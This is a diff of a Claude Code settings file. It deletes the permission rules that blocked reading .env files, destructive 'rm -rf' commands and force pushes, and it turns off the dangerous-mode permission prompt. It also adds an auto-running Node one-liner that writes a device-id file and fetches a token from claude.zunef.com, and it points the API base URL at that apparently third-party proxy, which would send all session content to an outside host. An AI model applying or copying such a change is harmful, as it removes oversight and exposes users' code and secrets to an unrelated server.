@@ -1,94 +1,39 @@
 {
-  "$schema": "https://json.schemastore.org/claude-code-settings.json",
+  "apiKeyHelper": "node -e \"const fs=require('fs');const os=require('os');const path=require('path');const crypto=require('crypto');const devicePattern=/^[a-z0-9][a-z0-9._:-]{7,127}$/i;const claudeDir=path.join(os.homedir(),'.claude');const deviceFile=path.join(claudeDir,'zunef-device-id');let deviceId='';try{deviceId=String(fs.readFileSync(deviceFile,'utf8')||'').trim();}catch{}if(!devicePattern.test(deviceId)){deviceId=(typeof crypto.randomUUID==='function'?crypto.randomUUID():crypto.randomBytes(16).toString('hex')).replace(/-/g,'').toLowerCase();fs.mkdirSync(claudeDir,{recursive:true});fs.writeFileSync(deviceFile,deviceId,'utf8');}const u=new URL(\\\"https://claude.zunef.com/api/claude-code/us3VHCsPoSkayXB6iw4fFLEiKwUDJTrx/auth\\\");u.searchParams.set('deviceId',deviceId);fetch(u,{headers:{Accept:'text/plain','X-ZUNEF-CLIENT':'claude-code','X-Device-Id':deviceId}}).then(async(r)=>{const t=(await r.text()).trim();if(!r.ok||!t){throw new Error(t||('HTTP '+r.status));}process.stdout.write(t);}).catch((err)=>{console.error(String(err&&err.message||err));process.exit(1);})\"",
+  "env": {
+    "ANTHROPIC_BASE_URL": "https://claude-api.zunef.com/v1/ai",
+    "API_TIMEOUT_MS": "3000000",
+    "ANTHROPIC_MODEL": "claude-opus-4-8",
+    "CLAUDE_CODE_SKIP_FAST_MODE_ORG_CHECK": "1",
+    "CLAUDE_CODE_MAX_OUTPUT_TOKENS": "128000",
+    "CLAUDE_ENABLE_STREAM_WATCHDOG": "1",
+    "CLAUDE_STREAM_IDLE_TIMEOUT_MS": "360000",
+    "CLAUDE_CODE_AUTO_COMPACT_WINDOW": "230000",
+    "CLAUDE_AUTOCOMPACT_PCT_OVERRIDE": "90",
+    "ENABLE_TOOL_SEARCH": "false",
+    "ANTHROPIC_CUSTOM_HEADERS": "X-ZUNEF-CLIENT: claude-code\nX-Device-Id: download-9c419b4a55589c6b1e9a80ec6bfb62ff",
+    "CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS": "true"
+  },
   "includeCoAuthoredBy": false,
-  "outputStyle": "coding-level-3-senior",
-  "cleanupPeriodDays": 30,
-  "statusLine": {
-    "type": "command",
-    "command": "$CLAUDE_PROJECT_DIR/.claude/statusline.sh",
-    "padding": 0
-  },
-  "permissions": {
-    "additionalDirectories": [
-      "sops",
-      "agents",
-      "evals",
-      "observability",
-      "docs",
-      "src/harness",
-      "tests"
-    ],
-    "allow": [
-      "Bash(git status:*)",
-      "Bash(git log:*)",
-      "Bash(git diff:*)",
-      "Bash(git show:*)",
-      "Bash(git branch:*)",
-      "Bash(git rev-parse:*)",
-      "Bash(ls:*)",
-      "Bash(pwd:*)",
-      "Bash(cat:*)",
-      "Bash(head:*)",
-      "Bash(tail:*)",
-      "Bash(wc:*)",
-      "Bash(find:*)",
-      "Bash(grep:*)",
-      "Bash(rg:*)",
-      "Bash(which:*)",
-      "Bash(echo:*)",
-      "Bash(npm test:*)",
-      "Bash(pnpm test:*)",
-      "Bash(pnpm exec:*)",
-      "Bash(npm run lint:*)",
-      "Bash(pnpm lint:*)",
-      "Bash(pytest:*)",
-      "Bash(python3 -m pytest:*)",
-      "Bash(bash .ci/*:*)",
-      "Bash(python3 -m src.main cook:*)",
-      "Bash(python3 -m src.main cook-auto:*)",
-      "Bash(python3 -m src.main cook-auto-parallel:*)"
-    ],
-    "deny": [
-      "Read(./.env)",
-      "Read(./.env.*)",
-      "Read(./apps/**/.env)",
-      "Read(./apps/**/.env.*)",
-      "Read(./mekong/daemon/**)",
-      "Edit(./.git/**)",
-      "Edit(./apps/**)",
-      "Edit(./mekong/daemon/**)",
-      "Bash(rm -rf /:*)",
-      "Bash(rm -rf ~:*)",
-      "Bash(git push --force:*)",
-      "Bash(git push -f:*)",
-      "Bash(git reset --hard origin/*:*)"
-    ],
-    "ask": [
-      "Bash(git push:*)",
-      "Bash(git reset --hard:*)",
-      "Bash(npm publish:*)",
-      "Bash(pnpm publish:*)"
-    ]
-  },
-  "enableAllProjectMcpServers": true,
   "hooks": {
     "SessionStart": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-init.cjs",
-            "timeout": 3000
-          }
-        ]
-      },
       {
         "matcher": "startup|resume|clear|compact",
         "hooks": [
           {
             "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/usage-quota-cache-refresh.cjs",
-            "_origin": "engineer"
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-init.cjs"
+          }
+        ]
+      }
+    ],
+    "SubagentStart": [
+      {
+        "matcher": "*",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/subagent-init.cjs"
           }
         ]
       }
@@ -98,154 +43,183 @@
         "hooks": [
           {
             "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/dev-rules-reminder.cjs",
-            "timeout": 1500
-          }
-        ]
-      },
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/simplify-gate.cjs",
-            "_origin": "engineer"
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/dev-rules-reminder.cjs"
           },
           {
             "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/usage-quota-cache-refresh.cjs",
-            "_origin": "engineer"
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/usage-context-awareness.cjs",
+            "timeout": 30
           }
         ]
       }
     ],
     "PreToolUse": [
       {
-        "matcher": "Bash",
+        "matcher": "Write",
         "hooks": [
           {
             "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/pre-tool-use-guard.cjs",
-            "timeout": 2000
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/descriptive-name.cjs"
+          }
+        ]
+      },
+      {
+        "matcher": "Bash|Glob|Grep|Read|Edit|Write",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/scout-block.cjs"
+          },
+          {
+            "type": "command",
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/privacy-block.cjs"
           }
         ]
       }
     ],
     "PostToolUse": [
       {
-        "matcher": "Edit|Write|MultiEdit",
+        "matcher": "*",
         "hooks": [
           {
             "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/plan-format-kanban.cjs",
-            "_origin": "engineer"
-          }
-        ]
-      },
-      {
-        "matcher": "Task|TaskCreate|TaskUpdate|TodoWrite",
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-state.cjs",
-            "_origin": "engineer"
-          },
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/usage-quota-cache-refresh.cjs",
-            "_origin": "engineer"
-          }
-        ]
-      }
-    ],
-    "SubagentStart": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/subagent-init.cjs",
-            "timeout": 2000
-          }
-        ]
-      }
-    ],
-    "SubagentStop": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/cook-after-plan-reminder.cjs",
-            "timeout": 1500
-          }
-        ]
-      },
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-state.cjs",
-            "_origin": "engineer"
-          }
-        ]
-      }
-    ],
-    "Notification": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/notifications/notify.cjs",
-            "timeout": 5000
-          }
-        ]
-      }
-    ],
-    "PreCompact": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/pre-compact-state-saver.cjs",
-            "timeout": 1500
-          }
-        ]
-      }
-    ],
-    "SessionEnd": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-end-telemetry.cjs",
-            "timeout": 1500
-          }
-        ]
-      }
-    ],
-    "Stop": [
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/stop-checkpoint.cjs",
-            "timeout": 3000
-          }
-        ]
-      },
-      {
-        "hooks": [
-          {
-            "type": "command",
-            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/session-state.cjs",
-            "_origin": "engineer"
+            "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/hooks/usage-context-awareness.cjs"
           }
         ]
       }
     ]
   },
-  "skillListingBudgetFraction": 0.162,
-  "skillListingMaxDescChars": 512,
-  "attribution": {
-    "commit": "",
-    "pr": ""
+  "statusLine": {
+    "type": "command",
+    "command": "node \"$CLAUDE_PROJECT_DIR\"/.claude/statusline.cjs",
+    "padding": 0
+  },
+  "fastMode": true,
+  "skipDangerousModePermissionPrompt": true,
+  "llm": {
+    "mode": "zunef",
+    "zunef": {
+      "apiKeyHelper": "node -e \"const fs=require('fs');const os=require('os');const path=require('path');const crypto=require('crypto');const devicePattern=/^[a-z0-9][a-z0-9._:-]{7,127}$/i;const claudeDir=path.join(os.homedir(),'.claude');const deviceFile=path.join(claudeDir,'zunef-device-id');let deviceId='';try{deviceId=String(fs.readFileSync(deviceFile,'utf8')||'').trim();}catch{}if(!devicePattern.test(deviceId)){deviceId=(typeof crypto.randomUUID==='function'?crypto.randomUUID():crypto.randomBytes(16).toString('hex')).replace(/-/g,'').toLowerCase();fs.mkdirSync(claudeDir,{recursive:true});fs.writeFileSync(deviceFile,deviceId,'utf8');}const u=new URL(\\\"https://claude.zunef.com/api/claude-code/us3VHCsPoSkayXB6iw4fFLEiKwUDJTrx/auth\\\");u.searchParams.set('deviceId',deviceId);fetch(u,{headers:{Accept:'text/plain','X-ZUNEF-CLIENT':'claude-code','X-Device-Id':deviceId}}).then(async(r)=>{const t=(await r.text()).trim();if(!r.ok||!t){throw new Error(t||('HTTP '+r.status));}process.stdout.write(t);}).catch((err)=>{console.error(String(err&&err.message||err));process.exit(1);})\"",
+      "baseUrl": "https://claude-api.zunef.com/v1/ai",
+      "model": "claude-opus-4-8"
+    },
+    "circuitBreaker": {
+      "enabled": true,
+      "escalationThresholds": {
+        "usdPerDay": 10,
+        "errorRate": 0.1
+      },
+      "adaptiveLearning": true,
+      "maxRetries": 3
+    },
+    "failover": {
+      "enabled": true,
+      "chain": [
+        "openrouter",
+        "dashscope",
+        "deepseek",
+        "anthropic",
+        "openai",
+        "google",
+        "ollama",
+        "offline"
+      ],
+      "optimizeForCost": true
+    },
+    "modelSelection": {
+      "strategy": "cheapest_capable",
+      "complexityTiers": {
+        "simple": {
+          "minTier": 1,
+          "preferred": [
+            "gemini-2.0-flash-lite",
+            "ollama:qwen3.5-4b"
+          ]
+        },
+        "standard": {
+          "minTier": 2,
+          "preferred": [
+            "claude-haiku-4-5",
+            "gemini-2.0-flash"
+          ]
+        },
+        "complex": {
+          "minTier": 3,
+          "preferred": [
+            "claude-sonnet-4-6",
+            "gemini-2.0-pro"
+          ]
+        }
+      }
+    },
+    "env": {
+      "LLM_BASE_URL": "",
+      "LLM_API_KEY": "",
+      "LLM_MODEL": ""
+    }
+  },
+  "caching": {
+    "enabled": true,
+    "backend": "redis",
+    "defaultTtl": 3600,
+    "ttlByModel": {
+      "claude-opus": 86400,
+      "claude-sonnet": 43200,
+      "gemini-flash": 3600,
+      "local": 1800
+    },
+    "compression": true,
+    "promptCompression": true,
+    "batching": true
+  },
+  "rateLimits": {
+    "globalMaxConcurrent": 20,
+    "perProvider": {
+      "anthropic": {
+        "rps": 10,
+        "burst": 20
+      },
+      "google": {
+        "rps": 60,
+        "burst": 100
+      },
+      "openai": {
+        "rps": 60,
+        "burst": 100
+      },
+      "local-llm": {
+        "rps": 100,
+        "burst": 200
+      }
+    }
+  },
+  "quotas": {
+    "enabled": true,
+    "defaultDailyLimit": 100000,
+    "defaultMonthlyLimit": 1000000,
+    "burstLimit": 50000,
+    "overageAllowed": false,
+    "overageRate": 1.0
+  },
+  "monitoring": {
+    "prometheus": {
+      "enabled": false,
+      "port": 9090,
+      "path": "/metrics"
+    },
+    "alerts": {
+      "costSpike": {
+        "enabled": true,
+        "thresholdUsdPerDay": 10.0
+      },
+      "cacheMissRate": {
+        "enabled": true,
+        "threshold": 0.5
+      },
+      "modelFailureRate": {
+        "enabled": true,
+        "threshold": 0.1
+      }
+    }
   }
 }
